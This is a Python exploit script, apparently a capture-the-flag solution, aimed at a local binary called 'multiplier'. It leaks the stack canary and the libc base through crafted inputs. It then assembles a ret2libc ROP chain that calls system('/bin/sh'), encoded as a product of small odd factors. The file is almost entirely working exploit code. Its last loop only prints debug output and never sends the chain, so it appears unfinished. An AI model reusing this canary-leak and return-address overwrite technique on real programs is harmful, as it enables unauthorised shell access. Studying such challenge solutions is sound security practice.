from ptrlib import *
import math

libc = ELF("./libc-2.27.so")
sock = Process("./multiplier")

sock.recvline()

def primes(n):
    primfac = []
    d = 2
    while d*d <= n:
        while (n % d) == 0:
            primfac.append(d)  # supposing you want multiple factors repeated
            n //= d
        d += 1
    if n > 1:
       primfac.append(n)
    return primfac

# leak canary
sock.recvline()
for i in range(25):
    sock.sendline("255")
sock.sendline("0")
canary = bytes.fromhex(bytes2str(sock.recvline().rstrip()[:-0x18 * 2]))
canary = u64(b'\x00' + canary[::-1][1:])
dump("canary = " + hex(canary))

# leak libc base
sock.recvline()
for i in range(41):
    sock.sendline("255")
sock.sendline("0")
addr_retaddr = bytes.fromhex(bytes2str(sock.recvline().rstrip()[:-0x28 * 2]))
addr_retaddr = u64(addr_retaddr[::-1])
libc_base = (addr_retaddr - libc.symbol("__libc_start_main")) & 0xfffffffffffff000
dump("libc base = " + hex(libc_base))

# overwrite return address
rop_pop_rdi = 0x0002155f
payload = 0
payload = (payload | (libc_base + libc.symbol("system"))) << 64
payload = (payload | (libc_base + next(libc.find("/bin/sh")))) << 64
payload = (payload | (libc_base + rop_pop_rdi)) << 64
payload = (payload | canary) << (64 + 0x10 * 8)
print(hex(payload))
while payload > 0:
    pl = {}
    y = 1
    b = payload
    for w in range(3, 256, 2):
        n = int(math.log(payload / y) / math.log(w))
        if n == 0: continue
        pl[w] = n
        y *= w ** pl[w]
        #print(hex(y >> (len(hex(payload)[2:]) // 2 - 1) * 8))
        #print(hex(payload >> (len(hex(payload)[2:]) // 2 - 1) * 8))
        if y >> (len(hex(payload)[2:]) // 2 - 1) * 8 != payload >> (len(hex(payload)[2:]) // 2 - 1) * 8:
            y //= w ** (n // 2)
            pl[w] -= (n // 2)
        else:
            break
    else:
        dump("Bad luck!", "warning")
        print(hex(y))
        print(pl)
        print(hex(y * 3))
        exit()
    y = 1
    for w in pl:
        y *= pl[w]
    print(hex(payload))
    print(hex(y))
    mask = 0
    for i in range(len(hex(payload)[2:]) // 2 - 1):
        mask <<= 8
        mask |= 0xff
    payload &= mask
